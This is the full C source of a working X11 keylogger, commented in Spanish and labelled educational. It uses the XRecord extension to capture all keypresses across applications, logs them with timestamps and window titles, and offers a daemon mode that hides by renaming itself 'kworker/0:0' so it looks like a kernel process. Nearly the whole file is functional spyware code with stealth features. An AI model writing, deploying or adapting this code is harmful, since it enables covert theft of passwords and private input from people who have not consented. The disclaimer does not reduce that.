/*
 * X11 Educational Keylogger
 * 
 * AVISO LEGAL Y ÉTICO:
 * Este programa es solo para propósitos educativos y de investigación.
 * Demuestra las vulnerabilidades inherentes del protocolo X11 en sistemas Linux.
 * El uso no autorizado de este software puede ser ilegal.
 * Use solo en sistemas propios o con permiso explícito.
 * 
 * Este keylogger demuestra cómo cualquier aplicación en X11 puede capturar
 * eventos de teclado de otras aplicaciones sin necesidad de privilegios elevados,
 * una vulnerabilidad fundamental del diseño de X11 desde 1984.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <X11/extensions/record.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <getopt.h>

#define LOG_FILE "keylog.txt"
#define MAX_WINDOW_NAME 256
#define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel

// Estructura para encapsular el estado del keylogger
typedef struct {
    Display *display;
    Display *record_display;
    FILE *logfile;
    XRecordContext record_context;
    volatile sig_atomic_t running;
    int daemon_mode;
    int quiet_mode;
    char log_filename[256];
    char last_window[MAX_WINDOW_NAME];
    char display_env[64];  // Guardar DISPLAY para uso después de daemonizar
} KeyloggerState;

// Estado global del keylogger
static KeyloggerState g_state = {
    .display = NULL,
    .record_display = NULL,
    .logfile = NULL,
    .record_context = 0,
    .running = 1,
    .daemon_mode = 0,
    .quiet_mode = 0,
    .log_filename = LOG_FILE,
    .last_window = {0},
    .display_env = {0}
};

// Manejador de señales para limpieza
void signal_handler(int signum) {
    (void)signum; // Parámetro requerido pero no usado
    g_state.running = 0;
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("\n[!] Deteniendo keylogger...\n");
    }
}

// Obtener el nombre de la ventana activa
char* get_window_name(Display *display, Window window) {
    static char window_name[MAX_WINDOW_NAME];
    char *name = NULL;
    
    if (window == None) {
        strncpy(window_name, "Unknown", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        return window_name;
    }
    
    if (XFetchName(display, window, &name) && name) {
        strncpy(window_name, name, MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        XFree(name);
    } else {
        strncpy(window_name, "Unnamed Window", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
    }
    
    return window_name;
}

// Obtener la ventana con foco actual
Window get_focused_window(Display *display) {
    Window focused;
    int revert;
    
    XGetInputFocus(display, &focused, &revert);
    
    // Si es la ventana raíz o PointerRoot, intentar obtener la ventana real
    if (focused == None || focused == PointerRoot) {
        Window root = DefaultRootWindow(display);
        Window parent, *children;
        unsigned int nchildren;
        
        if (XQueryTree(display, root, &root, &parent, &children, &nchildren)) {
            if (nchildren > 0) {
                focused = children[nchildren - 1];
            }
            if (children) XFree(children);
        }
    }
    
    return focused;
}

// Convertir KeySym a string legible
const char* keysym_to_string(KeySym keysym) {
    static char buffer[32];
    
    // Teclas especiales
    switch(keysym) {
        case XK_Return: return "[ENTER]";
        case XK_BackSpace: return "[BACKSPACE]";
        case XK_Tab: return "[TAB]";
        case XK_Escape: return "[ESC]";
        case XK_Delete: return "[DELETE]";
        case XK_Home: return "[HOME]";
        case XK_End: return "[END]";
        case XK_Page_Up: return "[PGUP]";
        case XK_Page_Down: return "[PGDN]";
        case XK_Left: return "[LEFT]";
        case XK_Right: return "[RIGHT]";
        case XK_Up: return "[UP]";
        case XK_Down: return "[DOWN]";
        case XK_space: return " ";
        case XK_Shift_L:
        case XK_Shift_R: return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R: return "[CTRL]";
        case XK_Alt_L:
        case XK_Alt_R: return "[ALT]";
        case XK_Caps_Lock: return "[CAPS]";
        case XK_F1: return "[F1]";
        case XK_F2: return "[F2]";
        case XK_F3: return "[F3]";
        case XK_F4: return "[F4]";
        case XK_F5: return "[F5]";
        case XK_F6: return "[F6]";
        case XK_F7: return "[F7]";
        case XK_F8: return "[F8]";
        case XK_F9: return "[F9]";
        case XK_F10: return "[F10]";
        case XK_F11: return "[F11]";
        case XK_F12: return "[F12]";
        default: {
            char *str = XKeysymToString(keysym);
            if (str && strlen(str) == 1) {
                buffer[0] = str[0];
                buffer[1] = '\0';
                return buffer;
            } else if (str) {
                snprintf(buffer, sizeof(buffer), "[%s]", str);
                return buffer;
            }
            return "[UNKNOWN]";
        }
    }
}

// Obtener timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
}

// Registrar evento de tecla
void log_key_event(const char *window_name, const char *key_str) {
    char timestamp[64];
    get_timestamp(timestamp, sizeof(timestamp));
    
    // Escribir en archivo
    if (g_state.logfile) {
        fprintf(g_state.logfile, "[%s] [%s] %s\n", timestamp, window_name, key_str);
        fflush(g_state.logfile);
    }
    
    // Mostrar en consola solo si no está en modo silencioso/daemon
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
    }
}

// Callback para XRecord - aquí se procesan los eventos capturados
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    (void)closure; // No usado
    
    if (recorded_data->category == XRecordFromServer) {
        // Obtener el tipo de evento
        int event_type = recorded_data->data[0];
        
        // Solo procesar eventos KeyPress (tipo 2)
        if (event_type == KeyPress) {
            // Extraer el keycode del evento
            unsigned char keycode = recorded_data->data[1];
            
            // Obtener ventana con foco
            Window focused = get_focused_window(g_state.display);
            char *window_name = get_window_name(g_state.display, focused);
            
            // Convertir keycode a keysym usando XkbKeycodeToKeysym (reemplaza función deprecada)
            KeySym keysym = XkbKeycodeToKeysym(g_state.display, keycode, 0, 0);
            const char *key_str = keysym_to_string(keysym);
            
            // Detectar cambio de ventana (usando buffer estático en g_state)
            if (g_state.last_window[0] == '\0' || strcmp(g_state.last_window, window_name) != 0) {
                char window_change_msg[512];
                snprintf(window_change_msg, sizeof(window_change_msg), 
                        "\n--- Ventana activa: %s ---\n", window_name);
                if (g_state.logfile) {
                    fprintf(g_state.logfile, "%s", window_change_msg);
                    fflush(g_state.logfile);
                }
                if (!g_state.quiet_mode && !g_state.daemon_mode) {
                    printf("%s", window_change_msg);
                }
                // Copiar el nombre de ventana de forma segura
                strncpy(g_state.last_window, window_name, MAX_WINDOW_NAME - 1);
                g_state.last_window[MAX_WINDOW_NAME - 1] = '\0';
            }
            
            log_key_event(window_name, key_str);
        }
    }
    
    // IMPORTANTE: Liberar los datos grabados
    XRecordFreeData(recorded_data);
}

/**
 * Convierte un path relativo a absoluto.
 * Si ya es absoluto, lo copia sin cambios.
 */
void make_absolute_path(char *dest, const char *src, size_t dest_size) {
    if (src[0] == '/') {
        // Ya es absoluto
        strncpy(dest, src, dest_size - 1);
        dest[dest_size - 1] = '\0';
    } else {
        // Convertir a absoluto
        char cwd[256];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            snprintf(dest, dest_size, "%s/%s", cwd, src);
        } else {
            // Fallback: usar /tmp si no podemos obtener cwd
            snprintf(dest, dest_size, "/tmp/%s", src);
        }
    }
}

/**
 * Daemoniza el proceso para ejecutarse en segundo plano.
 * - Hace fork() para desacoplar del terminal padre
 * - Crea nueva sesión con setsid()
 * - Cambia el nombre del proceso para ocultarlo
 * - Cierra stdin/stdout/stderr
 * 
 * @return 0 si es el proceso hijo (daemon), -1 en error, >0 si es el padre
 */
int daemonize(void) {
    pid_t pid;
    
    // Convertir log_filename a path absoluto ANTES de cambiar directorio
    char abs_log[256];
    make_absolute_path(abs_log, g_state.log_filename, sizeof(abs_log));
    strncpy(g_state.log_filename, abs_log, sizeof(g_state.log_filename) - 1);
    g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
    
    // Primer fork: el padre termina, el hijo continúa
    pid = fork();
    if (pid < 0) {
        return -1;  // Error en fork
    }
    if (pid > 0) {
        // Proceso padre: mostrar info y terminar
        printf("[*] Daemon iniciándose en segundo plano...\n");
        printf("[*] Log: %s\n", g_state.log_filename);
        printf("[*] Para encontrar el PID: ps -eo pid,ppid,comm | grep kworker\n");
        printf("[*] Para detener: pkill -f \"kworker/0:0\" (buscar PPID != 2)\n");
        exit(0);
    }
    
    // Crear nueva sesión (desacoplar del terminal)
    if (setsid() < 0) {
        return -1;
    }
    
    // Segundo fork: previene que el daemon adquiera un terminal de control
    pid = fork();
    if (pid < 0) {
        return -1;
    }
    if (pid > 0) {
        exit(0);  // El primer hijo termina
    }
    
    // Ahora somos el daemon real (nieto del proceso original)
    
    // Cambiar el nombre del proceso para ocultarlo
    // Esto hace que aparezca como un proceso del sistema en `ps` y `top`
    if (prctl(PR_SET_NAME, DAEMON_PROCESS_NAME, 0, 0, 0) < 0) {
        // No es crítico si falla, continuamos
    }
    
    // NO cambiar directorio a raíz para evitar problemas con paths
    // El log ya tiene path absoluto
    
    // Establecer máscara de permisos
    umask(0);
    
    // Cerrar descriptores de archivo estándar
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirigir stdin/stdout/stderr a /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) {
            close(fd);
        }
    }
    
    return 0;  // Éxito, somos el daemon
}

/**
 * Limpia todos los recursos del keylogger.
 * Centraliza la lógica de limpieza para evitar duplicación.
 */
void cleanup_resources(void) {
    char timestamp[64];
    
    // Deshabilitar y liberar contexto de grabación
    if (g_state.record_context && g_state.record_display) {
        XRecordDisableContext(g_state.record_display, g_state.record_context);
        XRecordFreeContext(g_state.record_display, g_state.record_context);
        g_state.record_context = 0;
    }
    
    // Cerrar archivo de log
    if (g_state.logfile) {
        fprintf(g_state.logfile, "\n=== Sesión finalizada ===\n");
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(g_state.logfile, "Fin: %s\n\n", timestamp);
        fclose(g_state.logfile);
        g_state.logfile = NULL;
    }
    
    // Cerrar conexiones X11
    if (g_state.display) {
        XCloseDisplay(g_state.display);
        g_state.display = NULL;
    }
    
    if (g_state.record_display) {
        XCloseDisplay(g_state.record_display);
        g_state.record_display = NULL;
    }
}

/**
 * Muestra la ayuda de uso del programa.
 */
void print_usage(const char *prog_name) {
    printf("X11 Educational Keylogger\n");
    printf("USO EDUCATIVO SOLAMENTE\n\n");
    printf("Uso: %s [opciones]\n\n", prog_name);
    printf("Opciones:\n");
    printf("  -d, --daemon     Ejecutar en segundo plano (oculto)\n");
    printf("  -q, --quiet      Modo silencioso (sin output a consola)\n");
    printf("  -o, --output     Archivo de log (default: %s)\n", LOG_FILE);
    printf("  -h, --help       Mostrar esta ayuda\n\n");
    printf("Ejemplos:\n");
    printf("  %s                    # Modo normal, visible en consola\n", prog_name);
    printf("  %s -d                 # Modo daemon, oculto en segundo plano\n", prog_name);
    printf("  %s -d -o /tmp/k.log   # Daemon con log personalizado\n", prog_name);
}

// Función principal del keylogger
int start_keylogger(void) {
    char timestamp[64];
    
    // IMPORTANTE: Guardar DISPLAY antes de daemonizar
    // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
    const char *display_env = getenv("DISPLAY");
    if (display_env) {
        strncpy(g_state.display_env, display_env, sizeof(g_state.display_env) - 1);
        g_state.display_env[sizeof(g_state.display_env) - 1] = '\0';
    } else {
        // Valor por defecto si no está definido
        strncpy(g_state.display_env, ":0", sizeof(g_state.display_env) - 1);
    }
    
    // Si es modo daemon, daemonizar primero
    if (g_state.daemon_mode) {
        if (daemonize() < 0) {
            fprintf(stderr, "[!] Error: No se pudo daemonizar el proceso.\n");
            return 1;
        }
        // Después de daemonize(), el output va a /dev/null
        g_state.quiet_mode = 1;  // Forzar modo silencioso
    }
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger educativo iniciado.\n");
        printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
        printf("[*] Archivo de log: %s\n", g_state.log_filename);
        printf("[*] Presione Ctrl+C para detener.\n\n");
    }
    
    // Abrir conexión principal con X11 usando el DISPLAY guardado
    g_state.display = XOpenDisplay(g_state.display_env);
    if (g_state.display == NULL) {
        // Intentar con NULL como fallback
        g_state.display = XOpenDisplay(NULL);
        if (g_state.display == NULL) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
                fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
                fprintf(stderr, "[!] DISPLAY usado: %s\n", g_state.display_env);
            }
            return 1;
        }
    }
    
    // Verificar si la extensión XRecord está disponible
    int major, minor;
    if (!XRecordQueryVersion(g_state.display, &major, &minor)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    if (!g_state.quiet_mode) {
        printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
    }
    
    // Abrir segunda conexión para la grabación (requerido por XRecord)
    g_state.record_display = XOpenDisplay(g_state.display_env);
    if (g_state.record_display == NULL) {
        // Intentar con NULL como fallback
        g_state.record_display = XOpenDisplay(NULL);
    }
    if (g_state.record_display == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    
    // Abrir archivo de log
    g_state.logfile = fopen(g_state.log_filename, "a");
    if (g_state.logfile == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
        }
        XCloseDisplay(g_state.display);
        XCloseDisplay(g_state.record_display);
        return 1;
    }
    
    // Escribir encabezado en el log
    fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
    get_timestamp(timestamp, sizeof(timestamp));
    fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
    fprintf(g_state.logfile, "Modo: %s\n\n", g_state.daemon_mode ? "daemon" : "normal");
    fflush(g_state.logfile);
    
    // Configurar manejador de señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGHUP, SIG_IGN);  // Ignorar SIGHUP para daemons
    
    // Configurar el rango de eventos a capturar
    XRecordRange *record_range = XRecordAllocRange();
    if (record_range == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Capturar solo eventos de teclado (KeyPress)
    record_range->device_events.first = KeyPress;
    record_range->device_events.last = KeyPress;
    
    // Crear contexto de grabación para todos los clientes
    XRecordClientSpec client_spec = XRecordAllClients;
    g_state.record_context = XRecordCreateContext(g_state.record_display, 0, &client_spec, 1, &record_range, 1);
    
    if (g_state.record_context == 0) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede crear contexto XRecord.\n");
        }
        XFree(record_range);
        cleanup_resources();
        return 1;
    }
    
    XFree(record_range);
    
    if (!g_state.quiet_mode) {
        printf("[*] Contexto XRecord creado. Monitoreando...\n\n");
    }
    
    // Habilitar el contexto de grabación
    if (!XRecordEnableContextAsync(g_state.record_display, g_state.record_context, record_callback, NULL)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede habilitar contexto.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Loop principal - procesar eventos XRecord
    while (g_state.running) {
        XRecordProcessReplies(g_state.record_display);
    }
    
    // Limpieza
    if (!g_state.quiet_mode) {
        printf("\n[*] Limpiando recursos...\n");
    }
    
    cleanup_resources();
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger detenido correctamente.\n");
        printf("[*] Log guardado en: %s\n", g_state.log_filename);
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    int opt;
    
    // Opciones largas para getopt_long
    static struct option long_options[] = {
        {"daemon",  no_argument,       0, 'd'},
        {"quiet",   no_argument,       0, 'q'},
        {"output",  required_argument, 0, 'o'},
        {"help",    no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };
    
    // Parsear argumentos de línea de comandos
    while ((opt = getopt_long(argc, argv, "dqo:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'd':
                g_state.daemon_mode = 1;
                break;
            case 'q':
                g_state.quiet_mode = 1;
                break;
            case 'o':
                strncpy(g_state.log_filename, optarg, sizeof(g_state.log_filename) - 1);
                g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    return start_keylogger();
}
